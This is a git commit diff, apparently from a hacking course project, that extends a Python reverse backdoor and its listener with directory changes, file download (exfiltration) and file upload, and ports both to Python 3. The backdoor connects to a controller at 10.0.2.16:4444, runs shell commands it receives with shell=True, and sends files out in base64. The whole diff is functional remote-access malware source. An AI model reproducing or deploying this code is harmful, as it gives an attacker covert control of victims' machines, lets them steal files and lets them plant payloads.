4a123cf7352249abf2cd3da46ba9e292d59d3c9d
Edo <descience.thh10@gmail.com>
2023-01-10 12:20:27 +0700

    add cd, download, upload file to backdoor and refactor to python3

--- listener.py
+++ listener.py
@@ -1,5 +1,7 @@
 import socket
 import json
+import shlex
+import base64
 
 class Listener:
 
@@ -26,22 +28,44 @@ class Listener:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.conn.send(json_data)
+        self.conn.send(json_data.encode())
     
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data += self.conn.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue
+    
+    def write_file(self, path, content):
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(content))
+        return "[+] download successful."
+
+    def read_file(self, path):
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read())
 
     def run(self):
         while True:
             command = input(">> ")
-            command = command.split(" ")
-            result = self.exec_remotely(command)
+            # split string on spaces but preserve spaces enclosing
+            # in quotes e.g. cd "Program Files"
+            command = shlex.split(command)
+
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.exec_remotely(command)
+                if command[0] == "download" and "[-] error" not in result:
+                    result = self.write_file(command[1] ,result)
+            except:
+                result = "[-] error during command execution"
+
             print(result)
 
 listener = Listener("10.0.2.16", 4444)
--- reverse-backdoor.py
+++ reverse-backdoor.py
@@ -1,6 +1,8 @@
 import socket
 import subprocess
 import json
+import os
+import base64
 
 class Backdoor:
     
@@ -13,10 +15,10 @@ class Backdoor:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.conn.send(json_data)
+        self.conn.send(json_data.encode())
     
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data += self.conn.recv(1024)
@@ -28,14 +30,39 @@ class Backdoor:
         # cmd can be either string or list of strings representing the single command
         return subprocess.check_output(cmd, shell=True)
 
+    def change_working_dir_to(self, path):
+        os.chdir(path)
+        return "[+] changing working dir to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(content))
+        return "[+] download successful."
+
     def run(self):
         while True:
             command = self.reliable_receive()
-            if command[0] == "exit":
-                self.conn.close()
-                exit()
 
-            cmd_result = self.exec_system_command(command)
+            try:
+                if command[0] == "exit":
+                    self.conn.close()
+                    exit()
+                elif command[0] == "cd" and len(command)>1:
+                    # if command is "cd" without any arguments, do nothing
+                    cmd_result = self.change_working_dir_to(command[1])
+                elif command[0] == "download":
+                    cmd_result = self.read_file(command[1]).decode()
+                elif command[0] == "upload":
+                    cmd_result = self.write_file(command[1], command[2])
+                else:
+                    cmd_result = self.exec_system_command(command).decode()
+            except Exception:
+                cmd_result = "[-] error during command execution"
+
             self.reliable_send(cmd_result)
 
 backdoor = Backdoor("10.0.2.16", 4444)
